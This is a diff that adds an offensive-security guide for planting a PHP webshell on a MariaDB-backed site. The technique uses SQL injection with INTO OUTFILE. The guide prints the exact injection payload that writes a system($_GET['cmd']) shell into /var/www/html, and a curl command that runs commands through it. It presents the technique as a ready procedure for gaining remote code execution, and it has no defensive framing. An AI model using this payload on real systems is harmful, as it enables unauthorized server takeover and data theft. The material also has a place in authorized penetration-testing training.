@@ -1,0 +1,69 @@
+---
+title: 'Webshell OUTFILE Exploit: Deploying PHP Shell via SQL Injection'
+description: Learn to exploit MariaDB OUTFILE to deploy PHP webshell for remote code
+  execution.
+keywords:
+- MariaDB OUTFILE
+- PHP webshell
+- remote code execution
+- SQL injection
+- file system permissions
+- web server security
+- INTO OUTFILE
+- command execution
+- web application security
+---
+
+# WEBSHELL - OUTFILE
+
+## Context
+
+This guide focuses on exploiting MariaDB's OUTFILE feature to deploy a PHP webshell capable of remote code execution. This technique assumes you have knowledge of file system permissions, PHP execution, and prior experience with MariaDB command execution.
+
+## Theory
+
+### OUTFILE Functionality in MariaDB
+
+The OUTFILE feature in MariaDB allows you to write the results of a query to a file on the server. This capability can be exploited when SQL injection is possible, and the file system permissions allow writing. This method is viable in systems where web application security is lax, allowing an attacker to execute unintended SQL commands through injection.
+
+### PHP Webshell Basics
+
+A PHP webshell is a script that can execute system commands via a web interface. It is often used by attackers to gain remote access to a compromised server. The attack involves injecting PHP code into a file that can be accessed by the web server, thus allowing remote command execution.
+
+### File System Permissions and Security
+
+For the OUTFILE exploitation to succeed, the web server must have write permissions to the directory targeted for the webshell deployment. This scenario assumes that the attacker can write to web-accessible directories due to misconfigured permissions or vulnerabilities in the web application or the underlying server security policies.
+
+## Practice
+
+### Deploying a PHP Webshell via OUTFILE
+
+#### Steps
+
+1. **Inject PHP Shell Code**
+   
+   Begin by executing a command to inject simple PHP shell code into a file within the web server's document root. 
+
+   ```bash
+   SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+   ```
+
+   This command uses the MariaDB OUTFILE option to write a PHP script that takes a command parameter (`cmd`) from the URL query string and executes it.
+
+2. **Validate Webshell Functionality**
+
+   Once the shell is in place, validate its functionality by executing a system command through the webshell. This can be done via a command-line HTTP client like `curl`.
+
+   ```bash
+   curl http://target/shell.php?cmd=id
+   ```
+
+   Use this command to confirm remote access by displaying the current user ID on the server. If successful, it indicates that the webshell is operational and can execute system commands.
+
+#### Outcome
+
+By following these steps, you achieve remote code execution capabilities on the web server through the deployed PHP webshell. This technique allows an attacker to perform various high-privilege operations on the server, limited only by the permissions of the web server's execution environment.
+
+## Tools
+
+- **curl**: A command-line tool used for transferring data with URLs, which can be used to interact with the webshell and execute commands remotely.
